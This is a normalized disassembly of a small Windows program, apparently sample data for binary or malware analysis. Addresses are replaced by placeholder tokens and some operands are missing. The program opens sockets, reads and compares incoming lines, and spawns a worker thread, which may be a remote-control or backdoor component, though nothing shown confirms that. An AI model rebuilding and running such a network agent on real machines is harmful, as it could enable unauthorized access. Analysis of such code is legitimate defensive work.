call [ CloseHandle@IAT ]
jmp r-xdata
sub_402370
mov eax 0x111c
call sub_402600
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x3ff
xor eax eax
lea edi [ esp + 0x12d ]
mov [ esp + 0x12c ] bl
lea edx [ esp + 0x12c ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov ecx 0x400
mov [ esp + 0x15 ] eax
lea edi [ esp + 0x12c ]
mov [ esp + 0x19 ] eax
mov ebp [ esp + 0x1130 ]
mov [ esp + 0x1d ] eax
push ebx
mov [ esp + 0x25 ] eax
mov [ esp + 0x18 ] bl
mov [ esp + 0x29 ] ax
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x2b ] al
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x134 ]
push ecx
mov ecx ebp
call sub_4019e0
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x1
mov eax 0x1
pop ebx
add esp 0x111c
retn 0x4
mov ecx 0x400
xor eax eax
lea edi [ esp + 0x12c ]
push ebx
[ edi ]
lea edx [ esp + 0x130 ]
push 0x1000
push edx
mov ecx ebp
call sub_401a30
cmp eax 0xffffffff
je r-xdata
cmp eax ebx
je r-xdata
xor ecx ecx
cmp eax ebx
jle r-xdata
lea edi [ esp + 0x12c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x4
jb r-xdata
mov dl [ esp + ecx + 0x12c ]
cmp dl 0xa
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push rw-data
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea edi [ esp + 0x12c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov [ esp + ecx + 0x12c ] bl
cmp dl 0xd
je r-xdata
cmp [ rw-data ] bl
jne r-xdata
mov ecx 0x400
xor eax eax
lea edi [ esp + 0x12c ]
lea edx [ esp + 0x12c ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push ebx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x134 ]
push ecx
mov ecx ebp
call sub_4019e0
cmp eax 0xffffffff
jne r-xdata
inc ecx
cmp ecx eax
jl r-xdata
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x29 ]
mov [ esp + 0x28 ] bl
[ edi ]
stosw [ edi ]
lea edx [ esp + 0x28 ]
push 0x104
push edx
push ebx
stosb [ edi ]
call [ GetModuleFileNameA@IAT ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebx
push eax
push ebx
push ebp
push sub_401030
push ebx
push ebx
call [ CreateThread@IAT ]
push 0xffffffff
push eax
mov [ rw-data ] eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
cmp [ rw-data ] bl
je r-xdata
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x1
mov eax 0x1
pop ebx
add esp 0x111c
retn 0x4
jmp r-xdata
push ebx
call [ _endthreadex@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x111c
retn 0x4
call sub_402120
lea edx [ esp + 0x28 ]
push edx
call sub_4016b0
add esp 0x4
mov [ rw-data ] 0x1
sub_402600
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4027b5
cmp [ rw-data ] ebx
jne r-xdata
call sub_4027a0
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4027b2
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_402200
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4017a0
mov eax ecx
mov [ eax + 0x4 ] 0x0
mov [ eax ] 0xffffffff
retn
j_sub_401a90
jmp sub_401a90
sub_401924
mov eax 0x1
retn
sub_40192a
mov esp [ ebp - 0x18 ]
mov ecx [ ebp - 0x540 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4019af
mov eax 0x1
retn
sub_401a90
push esi
mov esi ecx
push 0x0
mov eax [ esi ]
push eax
call [ shutdown@IAT ]
mov ecx [ esi ]
push ecx
call [ closesocket@IAT ]
pop esi
retn
sub_401ab0
mov eax [ ecx + 0x4 ]
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4027a0
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4027b2
xor eax eax
retn
sub_4027b5
retn
_controlfp
jmp [ _controlfp@IAT ]
connect
jmp [ connect@IAT ]
htons
jmp [ htons@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
send
jmp [ send@IAT ]
recv
jmp [ recv@IAT ]
closesocket
jmp [ closesocket@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
socket
jmp [ socket@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
select
jmp [ select@IAT ]
